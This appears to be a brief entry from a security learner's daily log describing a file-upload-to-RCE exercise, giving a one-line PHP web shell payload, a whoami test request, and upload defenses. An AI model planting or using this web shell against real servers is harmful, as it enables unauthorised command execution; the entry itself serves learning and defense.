# Day 39: File Upload to RCE

**Date:** October 30, 2026

## 🎯 What I Did Today
- Uploaded a PHP backdoor.

## 🧠 Key Takeaways
- Payload: `<?php system($_GET['cmd']); ?>`
- Visited `shell.php?cmd=whoami` and got Remote Code Execution (RCE).
- Defense: Validate file extensions, rename files, store outside web root.
